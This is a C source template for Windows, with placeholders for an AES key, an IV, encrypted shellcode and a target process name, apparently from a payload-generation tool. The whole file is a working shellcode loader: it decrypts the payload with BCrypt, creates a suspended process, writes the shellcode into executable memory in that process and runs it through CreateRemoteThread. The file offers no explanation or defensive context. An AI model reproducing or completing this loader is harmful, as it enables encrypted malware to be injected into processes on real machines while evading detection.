#include <stdio.h>
#include <windows.h>

{{key}}

{{iv}}

{{encrypted_shellcode}}

int DecryptShellcode() {
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    DWORD cbResult = 0;
    NTSTATUS status;
    DWORD scLen = sizeof(shellcode);

    status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
    if (status != 0) return -1;

    status = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
    if (status != 0) return -2;

    status = BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, key, sizeof(key), 0);
    if (status != 0) return -3;

    status = BCryptDecrypt(hKey, shellcode, scLen, NULL, iv, sizeof(iv), shellcode, scLen, &cbResult, 0);
    if (status != 0) return -4;

    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlg, 0);
    return 0;
}

int main()
{
    if (DecryptShellcode() != 0) {
        printf("[-] Decryption failed\n");
        return 1;
    }

    STARTUPINFOA si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    si.cb = sizeof(si);

    if (!CreateProcessA(
        NULL,                          
        (LPSTR)"{{process_name}}",          
        NULL,                          
        NULL,                          
        FALSE,                         
        CREATE_SUSPENDED,              
        NULL,                          
        NULL,                          
        &si,                          
        &pi                           
    )) {
        printf("[!] CreateProcess failed. Error: %lu\n", GetLastError());
        return 1;
    }

    printf("[+] Process created with PID: %lu\n", pi.dwProcessId);

    LPVOID VirtAlloc = VirtualAllocEx(pi.hProcess, NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (VirtAlloc == NULL) {
        printf("[!] VirtualAllocEx failed. Error: %lu\n", GetLastError());
        TerminateProcess(pi.hProcess, 1);
        return 1;
    }

    if (!WriteProcessMemory(pi.hProcess, VirtAlloc, shellcode, sizeof(shellcode), NULL)) {
        printf("[!] WriteProcessMemory failed. Error: %lu\n", GetLastError());
        TerminateProcess(pi.hProcess, 1);
        return 1;
    }

    printf("[+] Shellcode written to memory successfully\n");

    HANDLE RemoteThread = CreateRemoteThread(pi.hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)VirtAlloc, NULL, 0, NULL);
    if (RemoteThread == NULL) {
        printf("[!] CreateRemoteThread failed. Error: %lu\n", GetLastError());
        TerminateProcess(pi.hProcess, 1);
        return 1;
    }

    printf("[+] Remote thread created successfully\n");

    ResumeThread(pi.hThread);

    CloseHandle(RemoteThread);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return 0;
}